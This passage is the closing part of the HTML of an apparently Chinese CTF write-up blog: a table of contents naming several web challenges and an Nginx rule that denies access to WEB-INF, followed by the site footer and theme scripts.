class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-24"><span class="nav-number">1.28.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0CTF-2016-piapiapia"><span class="nav-number">1.29.</span> <span class="nav-text">[0CTF 2016]piapiapia</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-25"><span class="nav-number">1.29.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">1.30.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx-配合Tomcat做均衡负载或集群等情况时，可能出现问题。问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了：-location-WEB-INF-deny-all-或者return-404-或者其他！"><span class="nav-number">1.31.</span> <span class="nav-text">一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，可能出现问题。问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-26"><span class="nav-number">1.31.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="nav-number">1.32.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结-27"><span class="nav-number">1.32.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">irrik</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">189.7k</span>
  
</div>


  <div class="powered-by">
	<i class="fa fa-user-md"></i>
	<span id="busuanzi_container_site_uv">
		本站访客数:<span id="busuanzi_value_site_uv"></span>
	</span>
	<span class="post-meta-divider">|</span>
	<span id="busuanzi_container_site_pv">
		本站访问量<span id="busuanzi_value_site_pv"></span>
	</span>
</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
